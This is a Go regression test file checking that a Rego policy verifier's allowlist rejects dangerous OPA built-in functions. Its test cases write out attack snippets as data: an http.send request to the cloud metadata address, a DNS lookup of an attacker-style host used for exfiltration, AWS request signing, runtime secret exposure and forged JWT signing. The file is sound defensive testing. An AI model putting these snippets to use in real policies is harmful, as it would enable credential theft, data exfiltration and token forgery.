package rego_test

// Regression tests verifying that dangerous OPA built-in functions are blocked
// by the allowlist in safeCapabilities(). Each test case confirms that a policy
// attempting to use the listed built-in results in a DenialError rather than
// being silently allowed or causing an internal error.

import (
	"context"
	"testing"

	"github.com/yagihash/mini-gh-sts/pkg/verifier/rego"
)

func TestVerify_DangerousBuiltinsBlocked(t *testing.T) {
	tests := []struct {
		category string
		name     string
		snippet  string
	}{
		// ── External side-effects ──────────────────────────────────────────────
		{
			// SSRF / data exfiltration: can reach internal metadata endpoints
			// (e.g. GCP http://metadata.google.internal/) or exfiltrate OIDC claims.
			category: "network",
			name:     "http.send",
			snippet:  `_x := http.send({"method": "GET", "url": "http://169.254.169.254/"})`,
		},
		{
			// DNS exfiltration: encode sensitive data in a hostname and resolve it.
			category: "network",
			name:     "net.lookup_ip_addr",
			snippet:  `_x := net.lookup_ip_addr("evil.example.com")`,
		},
		{
			// AWS SigV4 signing: can forge authenticated AWS API requests using the
			// service account's ambient credentials.
			category: "network",
			name:     "providers.aws.sign_req",
			snippet:  `_x := providers.aws.sign_req({"method":"GET","url":"https://s3.amazonaws.com"},{"aws_service":"s3","aws_region":"us-east-1"},0)`,
		},
		// ── Runtime information exposure ───────────────────────────────────────
		{
			// Exposes OPA runtime config, including environment variables that may
			// contain secrets (API keys, service account credentials, etc.).
			category: "runtime_info",
			name:     "opa.runtime",
			snippet:  `_x := opa.runtime()`,
		},
		// ── Token forgery ─────────────────────────────────────────────────────
		{
			// Can forge arbitrary JWTs signed with a caller-supplied key, enabling
			// impersonation attacks if the signed token is accepted by other services.
			category: "jwt_signing",
			name:     "io.jwt.encode_sign",
			snippet:  `_x := io.jwt.encode_sign({"typ":"JWT","alg":"RS256"},{"sub":"forged"},{"kty":"RSA"})`,
		},
		{
			category: "jwt_signing",
			name:     "io.jwt.encode_sign_raw",
			snippet:  `_x := io.jwt.encode_sign_raw("{\"typ\":\"JWT\",\"alg\":\"RS256\"}","{\"sub\":\"forged\"}","{\"kty\":\"RSA\"}")`,
		},
		// ── Non-determinism ───────────────────────────────────────────────────
		{
			// Non-deterministic output makes policies unpredictable and untestable;
			// a policy could selectively allow/deny based on a random value.
			category: "nondeterminism",
			name:     "rand.intn",
			snippet:  `_x := rand.intn("seed", 100)`,
		},
		{
			category: "nondeterminism",
			name:     "uuid.rfc4122",
			snippet:  `_x := uuid.rfc4122("seed")`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.category+"/"+tt.name, func(t *testing.T) {
			content := policy(basePolicy + "\n" + tt.snippet)
			store := &staticPolicyStore{content: content}
			v := rego.New(store)
			_, _, err := v.Verify(context.Background(), claims(issuer), "org/repo", "policy")
			assertDenialError(t, err)
		})
	}
}
